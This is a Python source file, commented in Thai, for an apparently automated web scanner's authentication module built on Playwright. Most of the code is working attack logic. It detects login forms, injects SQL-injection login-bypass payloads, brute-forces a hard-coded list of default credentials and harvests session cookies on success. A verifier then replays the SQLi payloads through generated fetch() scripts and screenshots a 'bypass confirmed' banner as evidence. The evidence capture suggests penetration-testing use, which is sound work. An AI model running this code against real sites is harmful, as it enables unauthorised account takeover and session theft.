from playwright.sync_api import Page, sync_playwright
import base64
from src.core.logger import setup_logger

class AuthHandler:
    def __init__(self, logger=None):
        self.logger = logger or setup_logger("AuthHandler")
        self.cookies = None
        self.default_creds = [
            ("admin", "admin"), ("admin", "password"),
            ("root", "root"), ("user", "user"),
            ("test", "test"), ("admin", "123456")
        ]

    def find_and_login(self, page: Page, creds: dict) -> bool:
        """
        ค้นหาว่าหน้าปัจจุบันมีฟอร์ม Login หรือไม่ ถ้ามีให้ทำการ Login ทันที
        """
        # 1. เช็คว่ามี Input ประเภท Password หรือไม่ (สัญญาณที่ชัดเจนที่สุดของหน้า Login)
        password_input = page.locator('input[type="password"]')
        
        if password_input.count() > 0:
            self.logger.info(f"[Auth] 🕵️ Potential login form detected at {page.url}")
            return self.login_with_heuristics(page, creds)
        
        # 2. ค้นหาลิงก์ที่มีคำว่า Login, Sign in, เข้าสู่ระบบ
        login_link = page.locator('a:has-text("Login"), a:has-text("Sign in"), a:has-text("เข้าสู่ระบบ")').first
        if login_link.is_visible():
            self.logger.info("[Auth] 🔗 Login link found, navigating...")
            login_link.click()
            page.wait_for_load_state("networkidle")
            return self.login_with_heuristics(page, creds)
            
        return False

    def login_with_heuristics(self, page: Page, creds: dict) -> bool:
        """ใช้หลักการเดาชื่อ Field เพื่อกรอกข้อมูล"""
        try:
            # ค้นหาช่อง Username (text/email ที่อยู่ใกล้ password)
            user_input = page.locator('input[type="text"], input[type="email"], input[name*="user"], input[name*="login"]').first
            pass_input = page.locator('input[type="password"]').first
            submit_btn = page.locator('button[type="submit"], input[type="submit"], button:has-text("Login")').first

            if user_input.is_visible() and pass_input.is_visible():
                user_input.fill(creds.get("username"))
                pass_input.fill(creds.get("password"))
                
                # ถ่ายรูปก่อนกด Login เผื่อไว้ดูตอน Debug
                # self._capture_auth_step(page, "before_login")
                
                submit_btn.click()
                page.wait_for_load_state("networkidle")
                
                # ตรวจสอบว่า Login สำเร็จไหม (เช่น Password input หายไป หรือ URL เปลี่ยน)
                if page.locator('input[type="password"]').count() == 0:
                    self.cookies = page.context.cookies()
                    self.logger.info("[Auth] ✅ Automatic Login Successful!")
                    return True
        except Exception as e:
            self.logger.error(f"[Auth] ❌ Heuristic Login failed: {e}")
        return False

    def aggressive_entry(self, page: Page) -> bool:
        """
        กลยุทธ์เมื่อไม่มี Credential: ลอง Bypass และ Default Password
        """
        if page.locator('input[type="password"]').count() == 0:
            return False

        self.logger.info(f"[Auth] 🛡️ No credentials provided. Attempting Aggressive Entry at {page.url}")

        # วิธีที่ 1: SQL Injection Login Bypass (ท่ามาตรฐาน ' OR 1=1 --)
        if self._try_sqli_bypass(page):
            return True

        # วิธีที่ 2: Default Credentials Brute Force (ลองชุดรหัสยอดนิยม)
        if self._try_default_creds(page):
            return True

        return False

    def _try_sqli_bypass(self, page: Page) -> bool:
        """ลองใช้ SQLi Bypass เพื่อข้ามหน้า Login"""
        payloads = ["' OR '1'='1", "' OR 1=1 -- -", '" OR 1=1 -- -']
        try:
            user_input = page.locator('input[type="text"], input[type="email"]').first
            pass_input = page.locator('input[type="password"]').first
            submit_btn = page.locator('button[type="submit"], input[type="submit"]').first

            for payload in payloads:
                self.logger.info(f"[Auth] Trying SQLi Bypass payload: {payload}")
                user_input.fill(payload)
                pass_input.fill(payload)
                submit_btn.click()
                page.wait_for_load_state("networkidle", timeout=5000)

                if self._check_success(page):
                    self.logger.info(f"[Auth] ✅ Login Bypassed via SQLi!")
                    return True
                
                # ถ้าไม่สำเร็จ ให้กลับไปหน้าเดิมเพื่อลอง payload ถัดไป
                page.go_back() 
        except: pass
        return False

    def _try_default_creds(self, page: Page) -> bool:
        """ลองใช้รหัสผ่านยอดนิยม (Default Credentials)"""
        try:
            for user, pwd in self.default_creds:
                self.logger.info(f"[Auth] Trying Default Cred: {user}:{pwd}")
                page.locator('input[type="text"], input[type="email"]').first.fill(user)
                page.locator('input[type="password"]').first.fill(pwd)
                page.locator('button[type="submit"], input[type="submit"]').first.click()
                
                page.wait_for_load_state("networkidle", timeout=5000)
                if self._check_success(page):
                    self.logger.info(f"[Auth] ✅ Login Success via Default Creds!")
                    return True
                page.go_back()
        except: pass
        return False

    def _check_success(self, page: Page) -> bool:
        """เช็คว่าหน้าปัจจุบันถือว่า Login สำเร็จแล้วหรือยัง"""
        # 1. ไม่มีช่อง Password เหลืออยู่
        # 2. มีคำว่า Logout, My Account, หรือ Dashboard โผล่มา
        indicators = ["logout", "sign out", "my account", "dashboard", "profile", "ออกจากระบบ"]
        page_text = page.content().lower()
        
        has_no_pass = page.locator('input[type="password"]').count() == 0
        has_indicator = any(ind in page_text for ind in indicators)
        
        if has_no_pass and has_indicator:
            self.cookies = page.context.cookies()
            return True
        return False
    
    def _capture_evidence(self, page: Page) -> str:
        try:
            screenshot_bytes = page.screenshot(type="jpeg", quality=70, full_page=False)
            return base64.b64encode(screenshot_bytes).decode('utf-8')
        except Exception as e:
            self.logger.error(f"[-] Screenshot failed: {e}")
            return None
    
    # เพิ่ม Method นี้ใน Verifier หรือสร้าง Class ใหม่
    def verify_sqli_bypass(self, url: str, method: str, param_key: str, payload: str, content_type: str):
        """
        ตรวจสอบและถ่ายรูปหลักฐานเมื่อ SQLi Bypass สำเร็จ
        """
        self.logger.info(f"[VERIFIER] Verifying SQLi Bypass at {url}")
        result = {"confirmed": False, "screenshot": None}

        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(channel="chrome", headless=True)
                context = browser.new_context(ignore_https_errors=True)
                page = context.new_page()

                # 1. จำลองการส่ง Form (เหมือนหน้า Login จริง)
                if method.upper() == "POST":
                    # ใช้ท่า Fetch Bridge เพื่อส่ง Payload SQLi
                    fetch_script = self._generate_fetch_script(url, method, param_key, payload, content_type)
                    page.goto("about:blank")
                    page.evaluate(fetch_script)
                else:
                    # กรณี GET (ซึ่งพบบ้างในระบบเก่า)
                    target = f"{url}?{param_key}={payload}"
                    page.goto(target)

                page.wait_for_load_state("networkidle")
                page.wait_for_timeout(2000) # รอให้ Redirect สำเร็จ

                # 2. ตรวจสอบว่า "ทะลุ" เข้าไปได้จริงไหม
                # เช็คจาก Keyword หรือการหายไปของช่อง Password
                indicators = ["logout", "dashboard", "profile", "my account", "ออกจากระบบ"]
                page_content = page.content().lower()
                
                if any(ind in page_content for ind in indicators):
                    result["confirmed"] = True
                    # ใส่ Overlay บอกว่าเป็น SQLi Bypass สำเร็จ
                    page.evaluate("""
                        const b = document.createElement('div');
                        b.style.cssText = 'position:fixed;top:0;left:0;width:100%;background:purple;color:white;padding:15px;z-index:999999;text-align:center;font-weight:bold;';
                        b.innerText = '🛡️ SQL INJECTION LOGIN BYPASS CONFIRMED';
                        document.body.appendChild(b);
                    """)
                    result["screenshot"] = self._capture_evidence(page)

                browser.close()
        except Exception as e:
            self.logger.error(f"[VERIFIER] SQLi Verify Error: {e}")

        return result
    
    def _generate_fetch_script(self, url, method, param_key, payload, content_type):
        """
        สร้าง JavaScript สำหรับยิง Request โดยใช้ Fetch API 
        รองรับ SQLi/XSS Payload ที่มีอักขระพิเศษ
        """
        # 1. ทำการ Escape Backticks และ Backslashes ใน Payload 
        # เพื่อไม่ให้ไปตีกับ Template Literal ของ JavaScript
        safe_payload = payload.replace("\\", "\\\\").replace("`", "\\`").replace("${", "\\${")

        if content_type.lower() == "json":
            # กรณี API JSON
            return f"""
                (async () => {{
                    try {{
                        const response = await fetch('{url}', {{
                            method: '{method.upper()}',
                            headers: {{ 'Content-Type': 'application/json' }},
                            body: JSON.stringify({{ "{param_key}": `{safe_payload}` }})
                        }});
                        const html = await response.text();
                        document.open();
                        document.write(html);
                        document.close();
                    }} catch (e) {{
                        console.error('Fetch Error:', e);
                    }}
                }})();
            """
        else:
            # กรณี Form Standard (application/x-www-form-urlencoded)
            return f"""
                (async () => {{
                    try {{
                        const params = new URLSearchParams();
                        params.append('{param_key}', `{safe_payload}`);
                        
                        const response = await fetch('{url}', {{
                            method: '{method.upper()}',
                            body: params
                        }});
                        const html = await response.text();
                        document.open();
                        document.write(html);
                        document.close();
                    }} catch (e) {{
                        console.error('Fetch Error:', e);
                    }}
                }})();
            """